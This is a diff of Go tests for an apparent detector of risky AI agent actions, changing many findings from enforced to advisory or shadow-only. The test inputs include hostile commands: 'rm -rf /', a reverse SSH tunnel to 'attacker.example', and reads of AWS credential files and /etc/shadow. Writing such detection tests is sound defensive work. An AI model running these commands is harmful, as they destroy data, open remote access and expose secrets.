@@ -54,7 +54,7 @@ func TestTrustedActionSemanticIsolationAndPreview(t *testing.T) {
 	if credential == nil {
 		t.Fatalf("trusted action did not match PATH-AWS-CREDS: %v", FindingStrings(findings))
 	}
-	if credential.Evidence != "" || !credential.contributesToEnforcement() {
+	if credential.Evidence != "" || credential.contributesToEnforcement() {
 		t.Fatalf("semantic finding evidence/enforcement = %q/%v", credential.Evidence, credential.enforcement)
 	}
 
@@ -178,10 +178,14 @@ func TestTrustedActionCMDQuotedBenignDoesNotEmitBashParserUncertainty(t *testing
 		LegacyText:         malformed.Command,
 		Connector:          connector,
 		EnforcementCapable: true,
+		recordTelemetry: func(observation trustedActionTelemetry) {
+			if observation.ParserUncertaintyCount == 0 {
+				t.Fatalf("parser telemetry = %+v, want uncertainty count", observation)
+			}
+		},
 	})
-	if finding := findingWithID(findings, trustedParserUncertaintyRuleID); finding == nil ||
-		finding.contributesToEnforcement() {
-		t.Fatalf("malformed CMD command must retain detection-only uncertainty: %v", FindingStrings(findings))
+	if finding := findingWithID(findings, trustedParserUncertaintyRuleID); finding != nil {
+		t.Fatalf("malformed CMD command materialized parser telemetry as a finding: %+v", *finding)
 	}
 }
 
@@ -591,11 +595,12 @@ func TestTrustedActionLegacyPathFallbackRequiresPathFacts(t *testing.T) {
 	installDefaultProfileConnector(t, connector)
 
 	for _, test := range []struct {
-		name      string
-		input     actionfacts.Input
-		legacy    string
-		ruleID    string
-		wantMatch bool
+		name        string
+		input       actionfacts.Input
+		legacy      string
+		ruleID      string
+		wantMatch   bool
+		wantEnforce bool
 	}{
 		{
 			name: "cognitive filename used only as search pattern",
@@ -631,13 +636,15 @@ func TestTrustedActionLegacyPathFallbackRequiresPathFacts(t *testing.T) {
 		{
 			name: "actual cognitive file write",
 			input: actionfacts.Input{
-				Tool: "write_file",
-				Args: []byte(`{"path":"/repo/AGENTS.md","content":"updated"}`),
-				CWD:  "/repo",
+				Tool:             "write_file",
+				Args:             []byte(`{"path":"/repo/AGENTS.md","content":"updated"}`),
+				CWD:              "/repo",
+				ActiveAgentFiles: []string{"/repo/AGENTS.md"},
 			},
-			legacy:    `{"path":"/repo/AGENTS.md","content":"updated"}`,
-			ruleID:    "COG-AGENTS-MD",
-			wantMatch: true,
+			legacy:      `{"path":"/repo/AGENTS.md","content":"updated"}`,
+			ruleID:      "COG-AGENTS-MD",
+			wantMatch:   true,
+			wantEnforce: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -651,8 +658,14 @@ func TestTrustedActionLegacyPathFallbackRequiresPathFacts(t *testing.T) {
 			if got := matched != nil; got != test.wantMatch {
 				t.Fatalf("%s present=%t, want %t: %+v", test.ruleID, got, test.wantMatch, findings)
 			}
-			if matched != nil && !matched.contributesToEnforcement() {
-				t.Fatalf("%s lost enforcement: %+v", test.ruleID, *matched)
+			if matched != nil && matched.contributesToEnforcement() != test.wantEnforce {
+				t.Fatalf(
+					"%s enforcement=%t, want %t: %+v",
+					test.ruleID,
+					matched.contributesToEnforcement(),
+					test.wantEnforce,
+					*matched,
+				)
 			}
 		})
 	}
@@ -800,7 +813,7 @@ func TestTrustedActionReadOnlyInspectionDataBoundaryCrossPlatform(t *testing.T) 
 		})
 	}
 
-	t.Run("Windows sensitive path remains an action finding", func(t *testing.T) {
+	t.Run("Windows sensitive path read is advisory", func(t *testing.T) {
 		command := `Get-Content C:\Users\fixture\.aws\credentials`
 		findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
 			Input: actionfacts.Input{
@@ -810,9 +823,9 @@ func TestTrustedActionReadOnlyInspectionDataBoundaryCrossPlatform(t *testing.T) 
 			EnforcementCapable: true, DowngradeReadOnlyDataArgs: true,
 		})
 		matched := findingWithID(findings, "PATH-WIN-AWS-CREDS")
-		if matched == nil || matched.Severity == "LOW" ||
-			!matched.contributesToEnforcement() {
-			t.Fatalf("PATH-WIN-AWS-CREDS = %+v, want important enforceable finding", matched)
+		if matched == nil || matched.Severity != "MEDIUM" ||
+			matched.contributesToEnforcement() {
+			t.Fatalf("PATH-WIN-AWS-CREDS = %+v, want MEDIUM advisory", matched)
 		}
 	})
 
@@ -852,7 +865,7 @@ func TestTrustedActionReadOnlyInspectionDataBoundaryCrossPlatform(t *testing.T) 
 			command: "type .\\internal\\file & echo " + key,
 		},
 	} {
-		t.Run(test.name+" remains important", func(t *testing.T) {
+		t.Run(test.name+" remains audit only without risk pair", func(t *testing.T) {
 			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
 				Input: actionfacts.Input{
 					Tool: test.tool, Command: test.command, CWD: test.cwd,
@@ -861,23 +874,23 @@ func TestTrustedActionReadOnlyInspectionDataBoundaryCrossPlatform(t *testing.T) 
 				EnforcementCapable: true, DowngradeReadOnlyDataArgs: true,
 			})
 			matched := findingWithID(findings, "SEC-AWS-KEY")
-			if matched == nil || matched.Severity == "LOW" ||
-				!matched.contributesToEnforcement() {
-				t.Fatalf("SEC-AWS-KEY = %+v, want important enforceable finding", matched)
+			if matched == nil || matched.Severity != "LOW" ||
+				matched.contributesToEnforcement() {
+				t.Fatalf("SEC-AWS-KEY = %+v, want LOW detection-only finding", matched)
 			}
 		})
 	}
 
-	t.Run("action mode retains conservative reader enforcement", func(t *testing.T) {
+	t.Run("action mode read-only mention remains audit only", func(t *testing.T) {
 		command := "rg -n '" + key + "' internal/gateway"
 		findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
 			Input:      actionfacts.Input{Tool: "shell", Command: command, CWD: "/repo"},
 			LegacyText: command, Connector: connector, EnforcementCapable: true,
 		})
 		matched := findingWithID(findings, "SEC-AWS-KEY")
-		if matched == nil || matched.Severity == "LOW" ||
-			!matched.contributesToEnforcement() {
-			t.Fatalf("SEC-AWS-KEY = %+v, want conservative Action-mode finding", matched)
+		if matched == nil || matched.Severity != "LOW" ||
+			matched.contributesToEnforcement() {
+			t.Fatalf("SEC-AWS-KEY = %+v, want LOW detection-only finding", matched)
 		}
 	})
 }
@@ -967,7 +980,7 @@ func TestTrustedActionLegacyCommandsAndC2RequireActionFacts(t *testing.T) {
 	}
 }
 
-func TestTrustedActionLiteralCarriersPreserveEmbeddedExecution(t *testing.T) {
+func TestTrustedActionLiteralCarriersKeepPartialEmbeddedExecutionShadowOnly(t *testing.T) {
 	const connector = "trusted-action-literal-carrier-execution-test"
 	installDefaultProfileConnector(t, connector)
 	dangerous := "rm -rf " + "/"
@@ -1125,8 +1138,8 @@ func TestTrustedActionLiteralCarriersPreserveEmbeddedExecution(t *testing.T) {
 					}),
 				)
 			}
-			if matched != nil && !matched.contributesToEnforcement() {
-				t.Fatalf("CMD-RM-RF lost enforcement: %+v", *matched)
+			if matched != nil && matched.contributesToEnforcement() {
+				t.Fatalf("partial outer carrier became enforceable: %+v", *matched)
 			}
 		})
 	}
@@ -1218,8 +1231,8 @@ func TestTrustedActionUncertainCommandKeepsStaticActionEvidence(t *testing.T) {
 					actionfacts.Analyze(input),
 				)
 			}
-			if matched != nil && !matched.contributesToEnforcement() {
-				t.Fatalf("static uncertain action lost enforcement: %+v", *matched)
+			if matched != nil && matched.contributesToEnforcement() {
+				t.Fatalf("partial outer action became enforceable: %+v", *matched)
 			}
 		})
 	}
@@ -1336,17 +1349,20 @@ func TestTrustedActionDynamicExecutableEmitsParserUncertainty(t *testing.T) {
 			input := actionfacts.Input{
 				Tool: "Bash", Command: test.command, CWD: "/repo",
 			}
+			var parserTelemetry trustedActionTelemetry
 			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
 				Input: input, LegacyText: test.command, Connector: connector,
 				EnforcementCapable: true,
+				recordTelemetry: func(observation trustedActionTelemetry) {
+					parserTelemetry.merge(observation)
+				},
 			})
 			uncertainty := findingWithID(findings, trustedParserUncertaintyRuleID)
-			if uncertainty == nil || uncertainty.Severity != "LOW" ||
-				uncertainty.contributesToEnforcement() ||
-				!hasTag(uncertainty.Tags, trustedParserUncertaintyTag) {
+			if uncertainty != nil || parserTelemetry.ParserUncertaintyCount == 0 {
 				t.Fatalf(
-					"parser uncertainty = %+v, want visible LOW detection-only telemetry; findings=%+v facts=%+v",
+					"parser uncertainty finding = %+v telemetry=%+v, want metrics-only telemetry; findings=%+v facts=%+v",
 					uncertainty,
+					parserTelemetry,
 					findings,
 					actionfacts.Analyze(input),
 				)
@@ -1493,8 +1509,24 @@ func TestTrustedActionDynamicExecutableQuietControls(t *testing.T) {
 			EnforcementCapable: true,
 		})
 		matched := findingWithID(findings, "CMD-RM-RF")
-		if matched == nil || !matched.contributesToEnforcement() {
-			t.Fatalf("static malicious command %q lost enforcement: %+v", command, findings)
+		if matched == nil {
+			t.Fatalf("static malicious command %q lost detection: %+v", command, findings)
+		}
+		facts := actionfacts.Analyze(static)
+		_, wantEnforce := trustedSemanticOwnerFindingProof(
+			"CMD-RM-RF",
+			static,
+			facts,
+		)
+		if matched.contributesToEnforcement() != wantEnforce {
+			t.Fatalf(
+				"static command %q enforcement=%t, want %t: %+v facts=%+v",
+				command,
+				matched.contributesToEnforcement(),
+				wantEnforce,
+				findings,
+				facts,
+			)
 		}
 		if uncertainty := findingWithID(findings, trustedParserUncertaintyRuleID); uncertainty != nil {
 			t.Fatalf("static command %q emitted parser uncertainty: %+v", command, uncertainty)
@@ -1891,8 +1923,21 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 				if matched.contributesToEnforcement() || matched.Severity != "LOW" {
 					t.Fatalf("parser uncertainty became actionable: %+v", *matched)
 				}
-			} else if matched != nil && !matched.contributesToEnforcement() {
-				t.Fatalf("typed nested executable finding lost enforcement: %+v", *matched)
+			} else if matched != nil {
+				_, wantEnforce := trustedSemanticOwnerFindingProof(
+					"CMD-RM-RF",
+					test.input,
+					facts,
+				)
+				if matched.contributesToEnforcement() != wantEnforce {
+					t.Fatalf(
+						"nested finding enforcement=%t, want %t: %+v facts=%+v",
+						matched.contributesToEnforcement(),
+						wantEnforce,
+						*matched,
+						facts,
+					)
+				}
 			}
 		})
 	}
@@ -1978,18 +2023,20 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 				EnforcementCapable: true,
 			})
 			matched := findingWithID(findings, test.ruleID)
-			if matched == nil || !test.uncertain && !matched.contributesToEnforcement() {
+			if matched == nil {
 				t.Fatalf(
-					"%s missing or not enforceable: %+v facts=%+v nested=%+v",
+					"%s missing: %+v facts=%+v nested=%+v",
 					test.ruleID,
 					findings,
 					actionfacts.Analyze(input),
 					trustedBashFallbackActions(input, actionfacts.Analyze(input)),
 				)
 			}
-			if test.uncertain &&
-				(matched.contributesToEnforcement() || matched.Severity != "LOW") {
-				t.Fatalf("projection overflow became actionable: %+v", *matched)
+			if matched.contributesToEnforcement() {
+				t.Fatalf("partial outer projection became actionable: %+v", *matched)
+			}
+			if test.uncertain && matched.Severity != "LOW" {
+				t.Fatalf("projection overflow did not remain LOW: %+v", *matched)
 			}
 		})
 	}
@@ -2112,14 +2159,29 @@ func TestTrustedActionBashStaticExpansionUsesExecutionDialect(t *testing.T) {
 					trustedBashFallbackActions(input, actionfacts.Analyze(input)),
 				)
 			}
-			if matched != nil && !matched.contributesToEnforcement() {
-				t.Fatalf("%s lost enforcement: %+v", test.ruleID, *matched)
+			if matched != nil {
+				facts := actionfacts.Analyze(input)
+				_, wantEnforce := trustedSemanticOwnerFindingProof(
+					test.ruleID,
+					input,
+					facts,
+				)
+				if matched.contributesToEnforcement() != wantEnforce {
+					t.Fatalf(
+						"%s enforcement=%t, want %t: %+v facts=%+v",
+						test.ruleID,
+						matched.contributesToEnforcement(),
+						wantEnforce,
+						*matched,
+						facts,
+					)
+				}
 			}
 		})
 	}
 }
 
-func TestTrustedActionEmbeddedExecutionProjectsAllActionCategories(t *testing.T) {
+func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testing.T) {
 	const connector = "trusted-action-embedded-category-test"
 	installDefaultProfileConnector(t, connector)
 	shadow := "/etc/sha" + "dow"
@@ -2195,6 +2257,7 @@ func TestTrustedActionEmbeddedExecutionProjectsAllActionCategories(t *testing.T)
 	} {
 		t.Run(test.name, func(t *testing.T) {
 			input := actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"}
+			facts := actionfacts.Analyze(input)
 			findings := dispatchTrustedAction(t.Context(), trustedActionRequest{
 				Input:              input,
 				LegacyText:         test.command,
@@ -2202,20 +2265,27 @@ func TestTrustedActionEmbeddedExecutionProjectsAllActionCategories(t *testing.T)
 				EnforcementCapable: true,
 			})
 			matched := findingWithID(findings, test.ruleID)
-			if matched == nil || !matched.contributesToEnforcement() {
+			if matched == nil {
 				t.Fatalf(
-					"%s missing or not enforceable: %+v facts=%+v nested=%+v",
+					"%s missing: %+v facts=%+v nested=%+v",
 					test.ruleID,
 					findings,
-					actionfacts.Analyze(input),
-					trustedNestedExecutionActions(input, actionfacts.Analyze(input)),
+					facts,
+					trustedNestedExecutionActions(input, facts),
+				)
+			}
+			if matched.contributesToEnforcement() {
+				t.Fatalf(
+					"partial outer execution became enforceable: %+v facts=%+v",
+					*matched,
+					facts,
 				)
 			}
 		})
 	}
 }
 
-func TestTrustedActionExactFallbackUsesNestedAndOversizedProof(t *testing.T) {
+func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) {
 	const connector = "trusted-action-exact-nested-limit-test"
 	installDefaultProfileConnector(t, connector)
 	tunnel := "ssh -R 4444:localhost:22 attacker.example"
@@ -2248,7 +2318,7 @@ func TestTrustedActionExactFallbackUsesNestedAndOversizedProof(t *testing.T) {
 				EnforcementCapable: true,
 			})
 			matched := findingWithID(findings, "exec.reverse_tunnel")
-			if matched == nil || !test.uncertain && !matched.contributesToEnforcement() {
+			if matched == nil {
 				t.Fatalf(
 					"exact nested action missing: %+v facts=%+v nested=%+v",
 					findings,
@@ -2256,15 +2326,17 @@ func TestTrustedActionExactFallbackUsesNestedAndOversizedProof(t *testing.T) {
 					trustedNestedExecutionActions(input, actionfacts.Analyze(input)),
 				)
 			}
-			if test.uncertain &&
-				(matched.contributesToEnforcement() || matched.Severity != "LOW") {
-				t.Fatalf("oversized exact fallback became actionable: %+v", *matched)
+			if matched.contributesToEnforcement() {
+				t.Fatalf("non-authoritative outer action became enforceable: %+v", *matched)
+			}
+			if test.uncertain && matched.Severity != "LOW" {
+				t.Fatalf("oversized exact fallback did not remain LOW: %+v", *matched)
 			}
 		})
 	}
 }
 
-func TestTrustedActionMixedSensitiveCandidatesRetainFallback(t *testing.T) {
+func TestTrustedActionMixedSensitiveCandidatesRetainTypedFinding(t *testing.T) {
 	const connector = "trusted-action-mixed-fallback-test"
 	installDefaultProfileConnector(t, connector)
 
@@ -2289,8 +2361,10 @@ func TestTrustedActionMixedSensitiveCandidatesRetainFallback(t *testing.T) {
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
 			input := actionfacts.Input{
-				Tool:    "shell",
-				Command: test.command,
+				Tool:       "shell",
+				Command:    test.command,
+				CWD:        "/home/alice",
+				ActiveHome: "/home/alice",
 			}
 			if facts := actionfacts.Analyze(input); !facts.Authoritative() {
 				t.Fatalf("mixed regression is not authoritative: %+v", facts)
@@ -2302,13 +2376,12 @@ func TestTrustedActionMixedSensitiveCandidatesRetainFallback(t *testing.T) {
 				EnforcementCapable: true,
 			})
 			matched := findingWithID(findings, test.ruleID)
-			if matched == nil ||
-				matched.Evidence == "" ||
-				!matched.contributesToEnforcement() {
+			if matched == nil || !matched.contributesToEnforcement() ||
+				!matched.proof.authorizes(test.ruleID) {
 				t.Fatalf(
-					"fallback %s missing: %v facts=%+v",
+					"typed finding %s missing: %+v facts=%+v",
 					test.ruleID,
-					FindingStrings(findings),
+					matched,
 					actionfacts.Analyze(input),
 				)
 			}
@@ -2316,7 +2389,7 @@ func TestTrustedActionMixedSensitiveCandidatesRetainFallback(t *testing.T) {
 	}
 }
 
-func TestTrustedActionCredentialOwnersRequireExactLivePathShape(t *testing.T) {
+func TestTrustedActionCredentialOwnersRequireExactLivePathShapeAndStayAdvisory(t *testing.T) {
 	const connector = "credential-fallback-path-test"
 	installDefaultProfileConnector(t, connector)
 
@@ -2516,9 +2589,8 @@ func TestTrustedActionCredentialOwnersRequireExactLivePathShape(t *testing.T) {
 					FindingStrings(findings),
 				)
 			}
-			if matched != nil &&
-				!matched.contributesToEnforcement() {
-				t.Fatalf("finding is not enforceable: %+v", *matched)
+			if matched != nil && matched.contributesToEnforcement() {
+				t.Fatalf("read-only credential finding became enforceable: %+v", *matched)
 			}
 			if matched != nil {
 				if got := matched.Evidence != ""; got != test.fallback {
@@ -2526,6 +2598,18 @@ func TestTrustedActionCredentialOwnersRequireExactLivePathShape(t *testing.T) {
 						"fallback evidence=%t, want %t: %+v",
 						got,
 						test.fallback,
+						*matched,
+					)
+				}
+				wantSeverity := "MEDIUM"
+				if test.fallback {
+					wantSeverity = "LOW"
+				}
+				if matched.Severity != wantSeverity {
+					t.Fatalf(
+						"severity=%q, want %q: %+v",
+						matched.Severity,
+						wantSeverity,
 						*matched,
 					)
 				}
